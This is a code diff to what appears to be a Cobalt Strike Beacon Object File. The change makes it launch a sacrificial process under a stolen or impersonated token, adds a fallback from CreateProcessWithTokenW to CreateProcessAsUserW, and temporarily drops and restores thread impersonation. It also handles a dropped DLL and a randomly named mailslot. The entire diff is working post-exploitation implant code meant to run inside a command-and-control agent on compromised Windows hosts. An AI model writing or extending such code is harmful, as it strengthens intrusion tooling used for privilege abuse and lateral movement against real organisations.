@@ -296,6 +296,8 @@ static BOOL PpfCreateSacrificial(
     HANDLE hThreadToken = NULL;
     HANDLE hPrimary = NULL;
     BOOL ok;
+    DWORD errWithToken = 0;
+    DWORD errAsUser = 0;
 
     if (!useImpersonate) {
         return KERNEL32$CreateProcessW(
@@ -313,7 +315,8 @@ static BOOL PpfCreateSacrificial(
 
     if (!ADVAPI32$OpenThreadToken(
             KERNEL32$GetCurrentThread(),
-            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
+            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
+                TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_IMPERSONATE,
             FALSE,
             &hThreadToken)) {
         BeaconPrintf(
@@ -326,7 +329,7 @@ static BOOL PpfCreateSacrificial(
     if (!ADVAPI32$DuplicateTokenEx(
             hThreadToken,
             TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
-                TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
+                TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_IMPERSONATE,
             NULL,
             SecurityImpersonation,
             TokenPrimary,
@@ -339,23 +342,43 @@ static BOOL PpfCreateSacrificial(
         return FALSE;
     }
 
-    ok = ADVAPI32$CreateProcessAsUserW(
+    /*
+     * CreateProcessAsUser needs SeAssignPrimaryTokenPrivilege (usually SYSTEM).
+     * CreateProcessWithTokenW needs SeImpersonatePrivilege (typical for steal_token).
+     * Prefer WithToken; fall back to AsUser for SYSTEM agents.
+     */
+    ok = ADVAPI32$CreateProcessWithTokenW(
         hPrimary,
+        0,
         loaderW,
         cmdW,
-        NULL,
-        NULL,
-        FALSE,
         CREATE_NO_WINDOW,
         NULL,
         NULL,
         si,
         pi);
     if (!ok) {
-        BeaconPrintf(
-            CALLBACK_ERROR,
-            "[!] CreateProcessAsUser failed (err=%lu)",
-            KERNEL32$GetLastError());
+        errWithToken = KERNEL32$GetLastError();
+        ok = ADVAPI32$CreateProcessAsUserW(
+            hPrimary,
+            loaderW,
+            cmdW,
+            NULL,
+            NULL,
+            FALSE,
+            CREATE_NO_WINDOW,
+            NULL,
+            NULL,
+            si,
+            pi);
+        if (!ok) {
+            errAsUser = KERNEL32$GetLastError();
+            BeaconPrintf(
+                CALLBACK_ERROR,
+                "[!] CreateProcessWithToken failed (err=%lu); CreateProcessAsUser failed (err=%lu)",
+                errWithToken,
+                errAsUser);
+        }
     }
 
     KERNEL32$CloseHandle(hPrimary);
@@ -596,6 +619,8 @@ void go(IN PCHAR buffer, IN ULONG blength)
     char* managedArgs;
     char* impersonateFlag = NULL;
     BOOL useImpersonate = FALSE;
+    HANDLE hSavedImpersonation = NULL;
+    BOOL revertedImpersonation = FALSE;
     char slotName[TMPBUFLEN] = { 'p', 'p', 'f', 's', '-' };
     char mapRand[TMPBUFLEN] = { 'p', 'p', 'f' };
     char slotPath[PPF_SLOT_MAX];
@@ -678,6 +703,26 @@ void go(IN PCHAR buffer, IN ULONG blength)
         MSVCRT$_snprintf(loader, sizeof(loader), "%s", spawnto);
     } else {
         MSVCRT$_snprintf(loader, sizeof(loader), "%s", PPF_DEFAULT_SPAWNTO);
+    }
+
+    /*
+     * Running the BOF while the agent thread is impersonating (without
+     * --impersonate) can crash the agent on CreateProcess / temp / mailslot
+     * paths. Drop to the process primary token for this task, then restore.
+     */
+    if (!useImpersonate) {
+        if (ADVAPI32$OpenThreadToken(
+                KERNEL32$GetCurrentThread(),
+                TOKEN_ALL_ACCESS,
+                FALSE,
+                &hSavedImpersonation)) {
+            if (ADVAPI32$RevertToSelf()) {
+                revertedImpersonation = TRUE;
+            } else {
+                KERNEL32$CloseHandle(hSavedImpersonation);
+                hSavedImpersonation = NULL;
+            }
+        }
     }
 
     gen_rand_str(slotName, 5, 8);
@@ -845,5 +890,13 @@ cleanup:
     }
     if (wroteDll) {
         KERNEL32$DeleteFileA(dllPath);
+    }
+    if (revertedImpersonation && hSavedImpersonation) {
+        ADVAPI32$ImpersonateLoggedOnUser(hSavedImpersonation);
+        KERNEL32$CloseHandle(hSavedImpersonation);
+        hSavedImpersonation = NULL;
+    } else if (hSavedImpersonation) {
+        KERNEL32$CloseHandle(hSavedImpersonation);
+        hSavedImpersonation = NULL;
     }
 }
